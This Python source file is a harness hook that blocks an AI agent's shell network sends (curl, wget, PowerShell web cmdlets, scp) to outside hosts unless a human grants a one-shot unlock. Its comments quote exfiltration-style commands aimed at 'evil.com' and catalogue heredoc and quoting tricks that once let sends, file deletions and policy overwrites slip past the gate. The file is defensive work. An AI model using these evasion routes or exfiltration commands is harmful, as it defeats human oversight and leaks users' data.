# net-post — PreToolUse Bash|PowerShell. Single job: block shell network
# SENDS (POST/upload/form-submit) to non-loopback hosts; the unlock is a
# one-shot `auth-net <host>` typed by the human. This is the SHELL half of
# the send rules only — sends via web/MCP tools stay L2 prose. Plain GETs
# pass this hook (still governed by prose: a GET carrying repo-derived
# data is a send). Loopback and the allowlist in net-post-config.json
# (a policy path — single source for the carve-out list) pass free.
# A send verb with no resolvable host = deny, never allow (fail-closed).
import importlib.util
import json
import os
import re
import shlex
import sys
import time
from datetime import datetime

ROOT = (os.environ.get("HARNESS_ROOT") or os.environ.get("CLAUDE_PROJECT_DIR")
        or os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))
HERE = os.path.dirname(os.path.abspath(__file__))
CONFIG = os.path.join(HERE, "net-post-config.json")
UNLOCK = os.path.join(ROOT, ".agent-log", "net-unlock.json")

LOOPBACK = {"127.0.0.1", "localhost", "::1", "[::1]"}

try:
    _spec = importlib.util.spec_from_file_location(
        "unlockconsume", os.path.join(HERE, "unlock_consume.py"))
    uc = importlib.util.module_from_spec(_spec)
    _spec.loader.exec_module(uc)
except Exception:
    uc = None      # 66: fail closed at the call site, never crash open

SEND_TOOL = re.compile(
    r'(?i)(?<![\w-])(curl|wget|Invoke-WebRequest|Invoke-RestMethod|iwr|irm)'
    r'(?![\w-])')
SCP = re.compile(r'(?i)(?<![\w-])scp(?![\w-])')
BODY = re.compile(
    r'(?i)(?:^|\s)(-d|--data\S*|-F|--form|-T|--upload-file|--post-data\S*|'
    r'--post-file\S*|--method[= ]?(POST|PUT|PATCH|DELETE)|'
    r'-X\s*(POST|PUT|PATCH|DELETE)|-Method\s+(POST|PUT|PATCH|DELETE)|'
    r'-Body(?=\s|$)|-InFile(?=\s|$))')
URL_HOST = re.compile(r'(?i)https?://([^/\s:\'"]+)')

# A send names its destination as a bare operand too: `curl -d @x
# https://localhost evil.com` posts to BOTH, and URL_HOST sees only the first.
# So when a send carries a body, a host-shaped operand that is not a URL and
# not the value of a known value-taking flag is a destination this hook
# cannot verify -- deny. An unknown flag's value is checked, never skipped:
# skipping it would let `-s evil.com` hide the host.
BARE_HOST = re.compile(
    r'(?i)^(?:[\w.-]+@)?(?:localhost|\[[0-9a-f:.]+\]|[a-z0-9-]+(?:\.[a-z0-9-]+)+)'
    r'(?::\d+)?(?:/\S*)?$')
# Flags whose next token is a value in curl, wget and PowerShell alike. A short
# flag that is a switch in one tool and takes a value in another (-d, -F, -O,
# -c, -m, -b ...) is NOT here: skipping its "value" could hide the host.
VALUE_FLAGS = {
    "--data", "--data-raw", "--data-binary", "--data-ascii", "--data-urlencode",
    "--form", "--form-string", "-T", "--upload-file", "-o", "--output", "-H",
    "--header", "-X", "--request", "-u", "--user", "-A", "--user-agent",
    "--cookie", "--cookie-jar", "--config", "-w", "--write-out", "--max-time",
    "--connect-timeout", "--retry", "--range", "--cert", "--key", "--cacert",
    "--output-document", "--post-data", "--post-file", "--body-data",
    "--body-file", "--method",
}
PS_VALUE_FLAGS = {"-method", "-body", "-infile", "-outfile", "-headers",
                  "-contenttype"}
CLAUSE_SPLIT = re.compile(r'[;|&]+')
SCP_HOST = re.compile(r'(?:^|\s)(?:\S+@)?([\w.-]+):')

# A heredoc BODY handed to a NON-interpreter is data, not command. Writing
# a note that quotes a send, or committing a message that describes one, was
# read as performing the send -- which is how the incident report about this
# gate came to be blocked BY this gate, twice, including the log line recording
# it.
# The delimiter is a WORD, and bash builds it from quoted and unquoted
# parts alike -- `<<'EOF'sh` is the single delimiter `EOFsh`. Stopping at the
# closing quote sought the wrong terminator AND handed the leftover `sh` to the
# INTERP test, which kept prose bodies at deny tier. Group 3 is the unquoted
# tail; the delimiter is groups 2+3.
HEREDOC_RE = re.compile(r"<<-?\s*(['\"]?)([A-Za-z_][A-Za-z0-9_]*)\1([A-Za-z0-9_]*)")

# ...but a body fed to an INTERPRETER is executed, so stripping it there would
# convert a false positive into a real hole: `bash <<EOF ... curl -d @x
# https://host ... EOF` genuinely sends. `ssh host <<EOF` is itself the send.
# So the strip is conditional on what precedes the introducer, and the default
# when in doubt is to KEEP the body -- the noisy answer, never the blind one.
INTERP = re.compile(
    r'(?i)(?<![\w./\\-])(bash|sh|zsh|dash|ksh|python\d?(?:\.\d+)?|py|node|'
    r'perl|ruby|php|pwsh|powershell|cmd|ssh|docker|kubectl|env|xargs|eval|'
    r'sudo|nohup|timeout)(?![\w-])')

# A cut running from `<<DELIM` to the terminator also ate whatever shared
# the introducer's OWN line: `> CLAUDE.md` overwrote a policy path, `| bash`
# executed the body, `| curl -d @-` sent it, `&& rm CLAUDE.md` deleted one, and
# each of them then read as a bare `cat` with the evidence deleted.
#
# The body starts at the introducer's line END. That is the rule; it is
# approximate in TWO places, both named below -- quote state and the backslash
# test. Two earlier cuts of this fix tried to RECONSTRUCT that line end from
# shell grammar -- walk the redirects, then decide from the operator that
# follows -- because
# every caller flattened newlines before this ran. Both approximations leaked in
# both directions: a markdown blockquote opening a body read as a redirect and
# denied ordinary writes at deny tier, while `tee <<'EOF' CLAUDE.md`, `2>&1`,
# `<` and a second `<<` each ended the walk early and hid a real write.
#
# So the callers stop flattening (they flatten after this returns) and the
# newline is simply READ. Everything from `<<DELIM` to that newline is COMMAND
# -- redirects, operators, a piped successor, arguments -- and is kept verbatim.
# Only the body is cut. The two token-class regexes this replaced are gone.
#
# Precisely: the first newline that is neither escaped nor inside a quoted span.
# The walk tracks `'...'` and `"..."` because backslash
# parity alone cannot decide it -- inside single quotes bash gives a backslash no
# escaping power at all, so a run there is not a line end however it counts, and
# the redirect following the quote's close on the SAME logical line was cut
# unseen: blind at deny tier, since policy-mutate.py imports this predicate.
# The same walk tracks `$( ... )` depth and backtick state: a newline
# inside a command substitution on the introducer's line used to end the kept
# region early and cut the redirect after it, blind at deny tier in the same way.
# Depth is enough here -- quotes are already tracked, so a `$(` inside `'...'` is
# never counted -- and an unbalanced opener at the terminator keeps the remainder
# verbatim, the same monotone direction as an unterminated quote.
# split_clauses() below tracks quote state as well and is deliberately
# NOT reused: it splits clauses rather than finding a line end, and reaching for
# it would run a second full scan on a predicate that fires on every Bash call.
#
# The INTERP test now sees the introducer's line too, not just the text before
# `<<`: `cat <<'EOF' | bash` puts the interpreter AFTER the introducer, and a
# body that will be EXECUTED has to be kept whole.
#
# ponytail: input with no newline at all -- a body already flattened by some
# other path -- falls through to keeping the whole span. That is the safe
# direction for this gate: scan everything, never cut blind.


def strip_heredocs(cmd):
    """Remove <<DELIM ... DELIM spans that are NOT fed to an interpreter.

    Input is the RAW command with newlines intact: every caller flattens AFTER
    this returns, never before, so the introducer's line end is read rather than
    reconstructed from shell grammar. The terminator is still matched
    as a word rather than anchored to a line of its own -- deliberately loose, so
    a body that reached us already flattened by some other path still ends. That
    looseness is not free: a body containing the delimiter as a bare word ends
    the span early and leaves the rest of the body in what the gate scans, which
    over-blocks at deny tier. Named cost, still open; line-anchoring it when the
    input HAS newlines is the fix and is deliberately not in this change-set.

    shell-scope.py and net-post.py carry this function byte-identical rather
    than sharing a module: they are sibling hooks, not caller and callee, and an
    import would add a load-failure mode to a gate whose only safe fallback is
    "scan everything". The pair is pinned equal by
    test_shell_scope.py::TheHeredocPredicateIsSharedByCopy, so drift fails the
    suite instead of silently reopening 187 or 213 in one gate only.
    """
    out, i = [], 0
    while True:
        m = HEREDOC_RE.search(cmd, i)
        if not m:
            out.append(cmd[i:])
            break
        # Only the current clause decides: `cat f | bash` earlier in the line
        # says nothing about who receives THIS body.
        prefix = re.split(r'&&|\|\||[;|]', cmd[:m.start()])[-1]
        delim = m.group(2) + m.group(3)
        end = re.search(r"(?<![\w-])%s(?![\w-])" % re.escape(delim),
                        cmd[m.end():])
        if not end:
            # The former rule -- "unterminated heredoc: everything after
            # the introducer is the body" -- cut to the end of the command and
            # took real writes with it. This gate also fires on PowerShell,
            # which has NO `<<` heredoc, so every match in a PS command is a
            # false one and never terminates: a PS here-string whose body names
            # `<<EOF` lost the `> CLAUDE.md` sitting after its `'@` terminator,
            # blind at deny tier. Probed 2026-09-07; PS here-strings do not
            # match HEREDOC_RE at all, so keeping costs them nothing new.
            # No terminator means we cannot see where the body ends, so keep it
            # -- the noisy answer, never the blind one, same as INTERP below.
            out.append(cmd[i:])
            break
        stop = m.end() + end.end()
        # Where the introducer's line ends -- a backslash escapes the newline and
        # keeps the same logical line going. No newline before the terminator
        # means we cannot see the body's start: keep everything.
        # One quote-aware walk, not a backslash test. A DOUBLE backslash at
        # top level is an escaped backslash and the line ENDS there (the former
        # one-character test read it as a continuation and carried body text into
        # `line`); a backslash INSIDE `'...'` escapes nothing, so the parity
        # replacement then ended the line at a newline bash reads as quoted text
        # and cut the redirect after the quote's close (round-2 review, F1).
        # Scanning quote state settles both, and an unterminated quote keeps the
        # remainder verbatim -- monotone toward blocking, the same direction the
        # unterminated-heredoc branch above takes.
        j, q, sub, tick = m.end(), None, 0, False
        while j < stop:
            c = cmd[j]
            if c == "\\" and q != "'":
                j += 2          # escapes the next character, a newline included
                continue
            if q:
                if c == q:
                    q = None
            elif c in "'\"":
                q = c
            elif c == "`":
                tick = not tick     # not nestable, so a toggle, not a counter
            elif c == "$" and cmd[j + 1:j + 2] == "(":
                sub += 1
                j += 2
                continue
            elif sub and c == ")":
                sub -= 1
            elif c == "\n" and not sub and not tick:
                break
            j += 1
        if q or sub or tick or j > stop:
            j = stop
        line = cmd[m.end():j]
        # The space is load-bearing. `prefix` ends at the character before
        # `<<` and `line` starts at the character after the delimiter, so a
        # bare concatenation ABUTS two characters that are not adjacent in the
        # command: `bash<<EOF-1` builds the word `bash-1`, INTERP's `(?![\w-])`
        # stops matching, and a body bash really does execute gets stripped.
        # Measured: without it, `bash<<EOF-1` + `rm CLAUDE.md` deletes the file
        # unseen by a deny-tier gate. INTERP has 23 alternatives; a sweep of the
        # 24 concrete words they spell (`python\d?` gives python and python3)
        # against 9 word-extending characters found the bare join blind on all 24.

        # It is NOT free in the other direction, and the earlier claim here that
        # it "can only break a seam word, never make one" was false. The space
        # gives `line[0]` a left word-boundary it does not have in the command,
        # so `cat > n.md<<'EOF'sh` -- which bash reads as the single delimiter
        # word `EOFsh` -- used to match `sh` and KEEP a prose body at deny tier.
        # Fixed at the root: HEREDOC_RE now consumes the unquoted tail, so
        # `line` starts past it and the terminator sought is the real one.
        if INTERP.search(prefix + " " + line):
            out.append(cmd[i:stop])     # executed: keep it, verbatim
        else:
            # Same seam, same space, same reason (F2). What is
            # elided here is `<<DELIM`, never fewer than two characters, so a
            # space is a truer stand-in than nothing. Without it,
            # `tee<<EOF-1 <out-of-tree path>` rebuilt the word `tee-1` and
            # VERB_WR stopped matching a real out-of-tree write, while
            # `echo hi > CLAUDE<<'X'.md` rebuilt `CLAUDE.md` and denied, at
            # deny tier, a write to a file actually named `CLAUDE`.
            out.append(cmd[i:m.start()] + " " + line)
        i = stop
    return "".join(out)



def allow_hosts():
    try:
        with open(CONFIG, encoding="utf-8") as f:
            return {h.lower() for h in json.load(f).get("allow_hosts", [])}
    except Exception:
        return set()


def bare_host_operands(cmd):
    """Host-shaped operands of each send tool's clause that are not URLs."""
    found = []
    for clause in CLAUSE_SPLIT.split(cmd):
        m = SEND_TOOL.search(clause)
        if not m:
            continue
        rest = clause[m.end():]
        try:
            toks = shlex.split(rest)
        except ValueError:
            toks = rest.split()
        skip = False
        for t in toks:
            if skip:
                skip = False
                continue
            if t.startswith("-"):
                skip = t in VALUE_FLAGS or t.lower() in PS_VALUE_FLAGS
                continue
            if "://" in t or t.startswith("@"):
                continue
            if BARE_HOST.match(t):
                found.append(t)
    return found


def deny(reason):
    try:
        d = os.path.join(ROOT, ".agent-log")
        os.makedirs(d, exist_ok=True)
        with open(os.path.join(d, time.strftime("%Y-%m-%d") + ".md"),
                  "a", encoding="utf-8") as f:
            f.write("- %s [net-post] DENY %s\n"
                    % (datetime.now().strftime("%H:%M:%S"), reason))
    except Exception:
        pass
    print(json.dumps({"hookSpecificOutput": {
        "hookEventName": "PreToolUse",
        "permissionDecision": "deny",
        "permissionDecisionReason": "net-post: " + reason,
    }}))
    sys.exit(0)


def consume_unlock(hosts):
    # Hardened consumption is shared: unlock_consume.py carries the semantics
    # ported from policy-mutate. If the module failed to
    # load, the unlock is treated as ABSENT (deny path), never as granted;
    # main() names the load failure in its deny reason.
    if uc is None:
        return False
    u = uc.consume(UNLOCK, match=lambda g: g.get("host") and all(
        h == g["host"].lower() for h in hosts))
    if u is None:
        return False
    try:
        d = os.path.join(ROOT, ".agent-log")
        with open(os.path.join(d, time.strftime("%Y-%m-%d") + ".md"),
                  "a", encoding="utf-8") as f:
            f.write("- %s [net-post] unlock-consumed: %s\n"
                    % (datetime.now().strftime("%H:%M:%S"), u["host"]))
    except Exception:
        pass
    return True


def main():
    # Cloud-off under the
    # marker -- egress on both cloud targets is the proxy's job (§2), not
    # this hook's; Windows is untouched (uc.cloud_boundary() reads None
    # there, always -- see its docstring).
    if uc is not None and uc.cloud_boundary():
        sys.exit(0)
    try:
        data = json.load(sys.stdin)
    except Exception:
        sys.exit(0)          # no command text = nothing to judge
    cmd = (data.get("tool_input") or {}).get("command") or ""
    if not cmd:
        sys.exit(0)
    # Prose in a non-interpreter heredoc body is not a send. Everything
    # below judges the command with those bodies removed.
    # Strip FIRST, flatten after -- strip_heredocs needs the newlines the
    # rest of this hook does not want.
    cmd = strip_heredocs(cmd).replace("\n", " ")
    is_scp = bool(SCP.search(cmd))
    if not is_scp:
        if not SEND_TOOL.search(cmd) or not BODY.search(cmd):
            sys.exit(0)      # not a send: no verb, or verb without body
    hosts = [h.lower() for h in URL_HOST.findall(cmd)]
    if is_scp and not hosts:
        hosts = [h.lower() for h in SCP_HOST.findall(cmd)]
    hosts = [h for h in hosts if h]
    if not is_scp:
        bare = bare_host_operands(cmd)
        if bare:
            deny("send with a body names a bare host operand %s -- curl and wget "
                 "send to it as well as to any URL, and this hook cannot verify "
                 "it. Use a full https:// URL; 'auth-net <host>' names the host"
                 % ", ".join("'%s'" % h for h in bare))
    if not hosts:
        deny("send verb with no resolvable target host — cannot verify "
             "destination. Unlock: 'auth-net <host>' names the host")
    ok = LOOPBACK | allow_hosts()
    outward = [h for h in hosts if h not in ok]
    if not outward:
        sys.exit(0)
    if consume_unlock(outward):
        sys.exit(0)
    # Name every matched host, not just the first: consume_unlock requires ALL
    # of them to equal the single granted host, so printing one sends the human
    # after a grant that cannot consume. A prose false positive yields several.
    names = ", ".join("'%s'" % h for h in outward)
    reason = ("send to non-loopback host(s) %s. A grant covers ONE host and "
              "every matched host must equal it, so a list of two or more "
              "cannot be unlocked at all. If these are ordinary words rather "
              "than hostnames, this is a false positive - escalate, do not "
              "reword. Otherwise submit 'auth-net <host>' as its own user "
              "message, then retry exactly one send (one shot, 30 min)"
              % names)
    if uc is not None:
        reason += uc.stale_note(UNLOCK)   # An expired grant says so
    if uc is None:
        # The shared consumption module failed to load, so no grant can
        # be spent this session -- fail-closed, and say so rather than
        # sending the human after an unlock that cannot consume.
        reason += (" [unlock_consume.py failed to load -- the unlock cannot "
                   "be consumed this session; fail-closed]")
    deny(reason)


if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        # An uncaught raise exits 1, which Claude Code treats as
        # non-blocking, so a crash let the call through. Fail closed instead.
        deny("crashed (%s) -- refusing rather than passing the call ungated" % type(e).__name__)
